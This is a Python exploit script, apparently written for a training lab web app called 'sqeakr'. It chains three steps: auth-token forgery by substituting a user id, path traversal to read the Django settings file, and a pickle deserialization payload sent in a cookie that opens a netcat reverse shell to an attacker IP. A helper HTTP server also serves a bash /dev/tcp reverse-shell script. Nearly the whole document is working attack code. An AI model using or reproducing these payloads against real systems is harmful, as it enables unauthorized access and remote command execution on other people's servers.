import httpx
import base64
import re
from jsonpath_ng import parse
from concurrent.futures import ThreadPoolExecutor
from http.server import HTTPServer, SimpleHTTPRequestHandler
import pickle

proxy = {
        "http://": "http://localhost:8080",
        "https://": "http://localhost:8080",
}

client = httpx.Client(
        verify=False,
        timeout=10.0,
        proxies=proxy,
)

# Config
TARGET_IP = "sqeakr"
TARGET_PORT = "80"
ATTACKER_IP = "192.168.45.193"
REVSHELL_PORT = "4444"
HTTPSERVER_PORT = "80"
URL = f"http://{TARGET_IP}:{TARGET_PORT}/"

class CustomHTTPHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(f"#!/bin/bash\n/bin/bash -i >& /dev/tcp/{ATTACKER_IP}/{REVSHELL_PORT} 0>&1".encode());

def run_background_http_server():
    server = HTTPServer((ATTACKER_IP, int(HTTPSERVER_PORT)), CustomHTTPHandler)
    executor = ThreadPoolExecutor()
    executor.submit(server.serve_forever)
    executor.shutdown(wait=False)

class RCE(object):
    def __reduce__(self):
        return (exec, (f"import os;os.system('nc {ATTACKER_IP} {REVSHELL_PORT} -e /bin/bash')",))

def make_forgery_token():
    res = client.get(f"{URL}api/sqeaks?page=0&count=25")
    assert res.status_code == 200

    obj = res.json()
    userids = list(set([o["owner"]["userid"] for o in obj]))

    res = client.post(f"{URL}api/login", json={"username":"notexists","password":"notexists"})
    assert res.status_code == 401
    
    tmp_auth_token = base64.b64decode(res.json()["authtoken"])
   
    id = userids[0]
    auth_token = base64.b64encode(tmp_auth_token.replace(b"00000000-0000-4000-8000-000000000000", id.encode())).decode()
    print(f"[+] Auth token generated.: {auth_token}")
    return auth_token

def get_secret_key(auth_token):
    file_path = base64.b64encode(b"../../../../../../home/student/sqeakr/sqeakr/settings.py").decode()
    res = client.get(f"{URL}api/profile/preview/{file_path}", headers={"token":file_path, "authtoken": auth_token})

    file = base64.b64decode(res.json()["image"].split(",")[1]).decode()
    secret_key = re.findall(r"SECRET_KEY = '(.*)'", file)[0]
    print(f"[+] Secret key found. {secret_key}")
    return secret_key

def pickle_exploit(Secret):
    p = pickle.dumps(RCE())
    payload = base64.b64encode(p).decode()
    print("[+] Attempting exploit... please check your listner.")
    res = client.get(f"{URL}api/draft", headers={"authtoken": auth_token}, cookies={"draft": payload})

if __name__ == "__main__":
    auth_token = make_forgery_token()
    secret_key = get_secret_key(auth_token) 
    pickle_exploit(secret_key)

